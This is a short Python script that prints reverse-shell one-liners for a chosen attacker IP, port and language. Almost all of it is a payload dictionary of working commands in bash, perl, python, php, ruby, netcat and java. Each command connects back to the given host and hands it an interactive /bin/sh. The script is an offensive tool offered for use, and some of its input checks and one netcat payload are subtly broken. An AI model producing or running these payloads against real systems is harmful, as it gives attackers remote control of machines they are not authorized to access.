#!/usr/bin/env python3
import argparse

parser = argparse.ArgumentParser()

parser.add_argument("-ip","--ipaddress",help="provide ip address")
parser.add_argument("-p","--port",help="provide port number")
parser.add_argument("-lang","--langauge",help="provide payload langauge")
parser.add_argument("-s","--silent",help="no Banner.")
args = parser.parse_args()

payloads = {
    "bash":   "bash -i >& /dev/tcp/{0}/{1} 0>&1",
    "perl":   """perl -e 'use Socket;$i="{0}";$p={1};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};""",
	"python": """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{0}",{1}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'""",
	"php":    """php -r '$sock=fsockopen("{0}",{1});exec("/bin/sh -i <&3 >&3 2>&3");'""",
	"ruby":   """ruby -rsocket -e'f=TCPSocket.open("{0}",{1}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'""",
 	"nc":  "nc -e /bin/sh {0} {1}",
 	"nc1": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {0} {1} >/tmp/",
 	"java": """r = Runtime.getRuntime()
 		p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{0}/{1};cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
 		p.waitFor()""",
 	"xterm": "xterm -display {0}:{1}",
}


def ReverseShell(ip, port, language):
    lang = language
    payload = print("[+]Payload -> " + payloads[lang].format(ip,port))
    return payload

if args.ipaddress == "" :
    print("please provide the ip!")
elif args.port == "":
    print("Please provide the port!")
elif args.langauge == "":
    print("Please provide the payload language!")
else:
    cmd = ReverseShell(args.ipaddress,args.port,args.langauge)
